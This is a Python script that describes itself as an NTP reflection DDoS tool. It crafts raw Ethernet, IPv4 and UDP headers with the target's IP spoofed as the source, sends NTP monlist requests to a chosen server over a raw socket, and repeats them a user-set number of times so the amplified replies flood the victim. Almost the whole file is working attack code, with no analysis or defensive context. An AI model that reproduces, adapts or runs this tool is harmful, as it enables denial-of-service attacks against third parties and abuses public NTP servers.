#!/usr/bin/python3

from contextlib import closing
from socket import *
import sys
import struct
import time
import binascii
import subprocess

import argparse
from sys import argv

from multiprocessing import Pool as Pool

parser = argparse.ArgumentParser(description = 'Does an NTP reflection DDOS attack on Target IP')
parser.add_argument('-t', '--target', help='Target host', required=True)
parser.add_argument('-n', '--ntp', help='NTP Server used', required=True)
parser.add_argument('-c', '--count', help='Amount of requests to reflect', required=True)
	
args = parser.parse_args(argv[1:])

t = args.target
n = args.ntp
c = int(args.count)

#dmac = 'aa:aa:aa:aa:aa:aa'
smac = '0c:9d:92:18:34:6F'

# Ethernet II (DIX) Protocol Types
ETH_P_IP = 0x0800		# Internet Protocol packet 

class IPPacket:
	def __init__(self, dmac, dst=n, src=t, sport=1, dport=1, l2pro=ETH_P_IP):
		self.dst = dst
		self.src = src
		self.sport = sport
		self.dport = dport
		self.dmac = dmac
		self.smac = smac
		self.l2pro = l2pro
#		self.raw1 = None
#		self.raw2 = None
#		self.raw3 = None
		self.create_ipv4_feilds_list()
		self.create_udp_fields()

## -- L2 - Ethernet Section ---- ##
	def assemble_eth_feilds(self):
# ---- Assemble All Feilds Of Ether Packet ---- #
		self.raw1 = struct.pack('!6s6sH' ,
		binascii.unhexlify(self.dmac.replace(":","")),
		binascii.unhexlify(self.smac.replace(":","")),
		self.l2pro)
#		return(self.raw1)

## -- L3 - IP Section ---- ##		
	def create_ipv4_feilds_list(self):
# ---- [Internet Protocol Version] ---- #
		ip_ver = 4
		ip_vhl = 5
		self.ip_ver = (ip_ver << 4 ) + ip_vhl
# ---- [ Differentiate Servic Field ] ---- #
		ip_dsc = 0
		ip_ecn = 0
		self.ip_dfc = (ip_dsc << 2 ) + ip_ecn
		
		self.ip_tol = 46		 # ---- [ Total Length]		
		self.ip_idf = 0	 # ---- [ Identification ]		
		ip_rsv = 0			 # ---- [ Flags ]
		ip_dtf = 0
		ip_mrf = 0
		ip_frag_offset = 0

		self.ip_flg = (ip_rsv << 7) + (ip_dtf << 6) + (ip_mrf << 5) + (ip_frag_offset)		
		self.ip_ttl = 255					 # ---- [ Total Length ]		
		self.ip_proto = IPPROTO_UDP			 # ---- [ Protocol ]		
		self.ip_chk = 13609				 # ---- [ Check Sum ]		
		self.ip_saddr = inet_aton(self.src)	 # ---- [ Source Address ]		
		self.ip_daddr = inet_aton(self.dst)	 # ---- [ Destination Address ]
		return
	
	def assemble_ipv4_feilds(self):
		self.raw2 = struct.pack('!BBHHHBBH4s4s' , 
		self.ip_ver,		# IP Version 
		self.ip_dfc,		# Differentiate Service Feild
		self.ip_tol,		# Total Length
		self.ip_idf,		# Identification
		self.ip_flg,		# Flags
		self.ip_ttl,		# Time to leave
		self.ip_proto,		# protocol
		self.ip_chk,		# Checksum
		self.ip_saddr,		# Source IP 
		self.ip_daddr		# Destination IP
		)
#		return(self.raw2)

## -- L4 - UDP Section ---- ##			
	def create_udp_fields(self):			
		self.udp_sport = 61337  # ---- [ Source Port]		
		self.udp_dport = 123	# ---- [ Destination Port ]		
		self.udp_len = 26		# ---- [ Total Length ]		
		self.udp_chk = 0		# ---- [ Check Sum ]
		
	def assemble_udp(self):
		self.raw3 = struct.pack('!HHHH' ,
		self.udp_sport,		 # IP Version 
		self.udp_dport,		 # Differentiate Service Feild
		self.udp_len,		 # Total Length
		self.udp_chk,		 # Identification
		)
#		return(self.raw3)	

class iface_check:
	def __init__(self):	
		self.iface_check1()
		self.iface_check2()	
	
	def iface_check1(self):
		with open ('temp1.txt', 'w+') as T1:
			alsobob = subprocess.call(['route', '-n'], stdout = T1)
		with open ('temp1.txt', 'r') as T1:
			for olines in T1:
				lines = olines.split()
				if (lines[0] == '0.0.0.0'):
					self.dfg = lines[1]
					self.iface = lines[7]
				else:
					pass
		return(self.dfg)
#		return
			
	def iface_check2(self):
		with open ('temp2.txt', 'w+') as T2:
			bob = subprocess.call(['arp', '-n'], stdout = T2)
		with open ('temp2.txt', 'r') as T2:	
			for olines in T2:
				lines = olines.split()
				if (lines[0] == self.dfg):
					self.dmac = lines[2]
				else:
					pass
#		return(dmac)
		return

def TheDoerPart():
#	PooL = Pool(1)
#	boom = 0
	iF = iface_check()
	ip = IPPacket(dmac = iF.dmac)
	s = socket(AF_PACKET, SOCK_RAW)
	s.bind((iF.iface, 0))


	ip.assemble_eth_feilds()		# L2 - assemble Ethernet Header
	ip.assemble_ipv4_feilds()		# L3 - assemble IPv4 Header
	ip.assemble_udp()				# L4 - asseblme UDP Header

## ---- NTP MESSAGE ---- ##	
#	msgstr = '\x1b' + 47 * '\0'
	monlstr = "\x17\x00\x03\x2a" + "\x00" * 4
	msg = monlstr.encode()

	complete =  ip.raw1 + ip.raw2 + ip.raw3  + msg	
#	PooL.map(boomboom(complete, s ))
#	boomboom(complete, s)
	x = 0
	while (x <= c):
		x += 1
		print(x)
		time.sleep(.5)
		s.send(complete)


#def boomboom(complete, s):

#	for boom in range (int(c+1)):
#		print(boom)

if __name__=='__main__':
	try:
		TheDoerPart()
	except KeyboardInterrupt as K:
	    subprocess.call(['sudo', 'rm', 'temp1.txt'])
	    subprocess.call(['sudo', 'rm', 'temp2.txt'])   
		exit(0)
	except Exception as E:
		print(E)							
